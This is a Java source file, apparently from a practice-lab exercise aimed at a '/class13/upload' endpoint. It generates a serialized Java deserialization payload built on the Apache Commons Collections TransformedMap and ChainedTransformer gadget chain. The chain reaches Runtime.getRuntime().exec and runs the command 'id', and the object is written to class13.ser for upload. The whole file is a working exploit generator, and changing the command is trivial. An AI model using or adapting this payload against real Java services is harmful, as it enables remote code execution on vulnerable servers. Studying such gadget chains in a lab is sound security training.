package class13;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * 生成 class13 的 payload — TransformedMap
 * 目标: 上传 TransformedMap，靶场反射调用 checkSetValue(Runtime.getRuntime())
 *       触发 ChainedTransformer 执行命令
 * 靶场: /class13/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Transformer[] chain = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"id"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(chain);
        Map inner = new HashMap();
        inner.put("key", "value");
        Map transformedMap = TransformedMap.decorate(inner, null, chainedTransformer);

        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("class13.ser"));
        oos.writeObject(transformedMap);
        oos.close();

        System.out.println("✅ 已生成: class13.ser");
    }
}
